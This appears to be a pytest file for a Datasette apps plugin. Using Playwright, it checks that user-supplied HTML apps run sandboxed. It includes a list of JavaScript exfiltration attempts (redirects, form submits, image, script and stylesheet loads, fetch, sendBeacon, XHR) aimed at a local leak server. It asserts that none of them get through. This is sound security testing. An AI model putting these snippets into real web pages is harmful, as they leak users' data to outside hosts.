from __future__ import annotations

import asyncio
import json
import socket
import sqlite3
import subprocess
import sys
import threading
import time
from contextlib import contextmanager
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.request import urlopen

import pytest
from datasette.app import Datasette
from playwright.sync_api import sync_playwright

from datasette_apps import Registry


def _free_port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


class DatasetteServer:
    def __init__(self, tmp_path: Path, files=None):
        self.files = files or []
        self.internal_db_path = tmp_path / "internal.db"
        self.config_path = tmp_path / "datasette.json"
        self.config_path.write_text(
            json.dumps({"permissions": {"view-app": True}}),
            encoding="utf-8",
        )
        self.port = _free_port()
        self.url = f"http://127.0.0.1:{self.port}"
        self.process = None

    async def create_app(
        self,
        html,
        *,
        name="Playwright app",
        sql_databases=None,
        csp_origins=None,
    ):
        datasette = Datasette(
            [str(path) for path in self.files],
            memory=True,
            internal=str(self.internal_db_path),
            config={"permissions": {"view-app": True}},
        )
        app = await Registry(datasette).create_stored_app(
            actor_id="alice",
            name=name,
            description="",
            html=html,
            is_private=False,
            sql_databases=sql_databases,
            csp_origins=csp_origins,
        )
        datasette.close()
        return app

    def app_url(self, app):
        return f"{self.url}/-/apps/{app['id']}"

    def __enter__(self):
        command = [
            sys.executable,
            "-m",
            "datasette",
            "serve",
            *[str(path) for path in self.files],
            "--memory",
            "--internal",
            str(self.internal_db_path),
            "--config",
            str(self.config_path),
            "--host",
            "127.0.0.1",
            "--port",
            str(self.port),
        ]
        self.process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        self._wait_for_server()
        return self

    def __exit__(self, exc_type, exc, traceback):
        self.process.terminate()
        try:
            self.process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            self.process.kill()
            self.process.communicate()

    def _wait_for_server(self):
        deadline = time.monotonic() + 10
        last_error = None
        while time.monotonic() < deadline:
            if self.process.poll() is not None:
                stdout, stderr = self.process.communicate()
                raise AssertionError(
                    "Datasette server exited before accepting requests\n"
                    f"stdout:\n{stdout}\n\nstderr:\n{stderr}"
                )
            try:
                with urlopen(self.url + "/-/versions", timeout=0.5) as response:
                    if response.status < 500:
                        return
            except OSError as ex:
                last_error = ex
            time.sleep(0.1)
        raise AssertionError(f"Datasette server did not start: {last_error}")


class LeakServer:
    def __init__(self):
        self.requests = []
        self._lock = threading.Lock()
        self._server = ThreadingHTTPServer(("127.0.0.1", 0), self._handler())
        self.url = f"http://127.0.0.1:{self._server.server_port}"
        self._thread = threading.Thread(target=self._server.serve_forever)
        self._thread.daemon = True

    def _handler(self):
        leak_server = self

        class Handler(BaseHTTPRequestHandler):
            def _record_and_respond(self):
                if self.path.startswith("/leak?"):
                    with leak_server._lock:
                        leak_server.requests.append(
                            {"method": self.command, "path": self.path}
                        )
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"ok")

            def do_GET(self):
                self._record_and_respond()

            def do_POST(self):
                self._record_and_respond()

            def log_message(self, format, *args):
                pass

        return Handler

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, exc_type, exc, traceback):
        self._server.shutdown()
        self._server.server_close()
        self._thread.join(timeout=5)


@contextmanager
def _browser_page():
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch()
        try:
            page = browser.new_page()
            yield page
        finally:
            browser.close()


def _iframe(page):
    frame = page.locator("#datasette-app-frame").element_handle()
    assert frame is not None
    iframe = frame.content_frame()
    assert iframe is not None
    return iframe


def _create_content_database(path):
    conn = sqlite3.connect(path)
    try:
        conn.execute("create table items (name text, score integer)")
        conn.executemany(
            "insert into items values (?, ?)",
            [
                ("alpha", 2),
                ("beta", 5),
            ],
        )
        conn.commit()
    finally:
        conn.close()


MALICIOUS_EXFILTRATION_ATTEMPTS = [
    pytest.param(
        "window.location.href = LEAK_URL;",
        id="window-location-href",
    ),
    pytest.param(
        "window.location.assign(LEAK_URL);",
        id="window-location-assign",
    ),
    pytest.param(
        "window.location.replace(LEAK_URL);",
        id="window-location-replace",
    ),
    pytest.param(
        """
const form = document.createElement("form");
form.method = "GET";
form.action = LEAK_BASE + "/leak";
const input = document.createElement("input");
input.name = "secret";
input.value = "top-secret";
form.appendChild(input);
document.body.appendChild(form);
form.submit();
""",
        id="get-form-submit",
    ),
    pytest.param(
        """
const form = document.createElement("form");
form.method = "POST";
form.action = LEAK_BASE + "/leak?secret=top-secret";
document.body.appendChild(form);
form.submit();
""",
        id="post-form-submit",
    ),
    pytest.param(
        """
const img = document.createElement("img");
img.src = LEAK_URL;
document.body.appendChild(img);
""",
        id="image-src",
    ),
    pytest.param(
        """
const script = document.createElement("script");
script.src = LEAK_URL;
document.body.appendChild(script);
""",
        id="script-src",
    ),
    pytest.param(
        """
const link = document.createElement("link");
link.rel = "stylesheet";
link.href = LEAK_URL;
document.head.appendChild(link);
""",
        id="stylesheet-href",
    ),
    pytest.param(
        'fetch(LEAK_URL, {mode: "no-cors"}).catch(function() {});',
        id="fetch-no-cors",
    ),
    pytest.param(
        'navigator.sendBeacon(LEAK_URL, "top-secret");',
        id="send-beacon",
    ),
    pytest.param(
        """
const xhr = new XMLHttpRequest();
xhr.open("GET", LEAK_URL);
xhr.send();
""",
        id="xml-http-request",
    ),
]


def _malicious_app_html(attempt_script, leak_url, leak_base):
    return f"""<!doctype html>
<html>
<head><title>Exfiltration attempt</title></head>
<body>
<p id="status">loaded</p>
<script>
const LEAK_URL = {json.dumps(leak_url)};
const LEAK_BASE = {json.dumps(leak_base)};
document.getElementById("status").textContent = "attempted";
setTimeout(function() {{
  try {{
{attempt_script}
  }} catch (error) {{
    document.getElementById("status").textContent = "attempted with error";
  }}
}}, 100);
</script>
</body>
</html>"""


def test_datasette_query_bridge_returns_data_to_iframe(tmp_path):
    content_db_path = tmp_path / "content.db"
    _create_content_database(content_db_path)
    server = DatasetteServer(tmp_path, files=[content_db_path])
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<p id="result">waiting</p>
<script>
(async function() {
  const result = await datasette.query(
    "content",
    "select name, score from items order by score desc"
  );
  document.getElementById("result").textContent = JSON.stringify(result.rows);
})();
</script>""",
            name="Query bridge",
            sql_databases=["content"],
        )
    )

    with server, _browser_page() as page:
        response = page.goto(server.app_url(app))
        assert response is not None
        assert response.headers["content-security-policy"] == "frame-src 'none';"
        iframe = _iframe(page)
        iframe.locator("#result").wait_for()
        assert iframe.locator("#result").inner_text() == (
            '[{"name":"beta","score":5},{"name":"alpha","score":2}]'
        )


def test_iframe_errors_render_in_parent_error_panel(tmp_path):
    server = DatasetteServer(tmp_path)
    app = asyncio.run(
        server.create_app(
            """<!doctype html>
<p>App with an error</p>
<script>
console.error("Playwright saw this app error");
</script>""",
            name="Error bridge",
        )
    )

    with server, _browser_page() as page:
        page.goto(server.app_url(app))
        page.locator(".datasette-app-error-panel:not([hidden])").wait_for()
        page.locator(".datasette-app-error-kind", has_text="console-error").wait_for(
            state="attached"
        )
        page.locator(
            ".datasette-app-error-message", has_text="Playwright saw this app error"
        ).wait_for(state="attached")
        assert page.locator(".datasette-app-error-count").inner_text() == "1 error"
        assert (
            page.locator(".datasette-app-error-kind").text_content() == "console-error"
        )
        assert (
            page.locator(".datasette-app-error-message").text_content()
            == "Playwright saw this app error"
        )


@pytest.mark.parametrize("attempt_script", MALICIOUS_EXFILTRATION_ATTEMPTS)
def test_malicious_apps_cannot_exfiltrate_to_external_origin(
    tmp_path, attempt_script
):
    with LeakServer() as leak_server:
        server = DatasetteServer(tmp_path)
        leak_url = leak_server.url + "/leak?secret=top-secret"
        app = asyncio.run(
            server.create_app(
                _malicious_app_html(attempt_script, leak_url, leak_server.url),
                name="Exfiltration attempt",
            )
        )

        with server, _browser_page() as page:
            response = page.goto(server.app_url(app))
            assert response is not None
            assert response.headers["content-security-policy"] == "frame-src 'none';"
            iframe = _iframe(page)
            iframe.locator("#status").wait_for()
            assert iframe.locator("#status").inner_text() == "attempted"
            page.wait_for_timeout(500)

        assert leak_server.requests == []
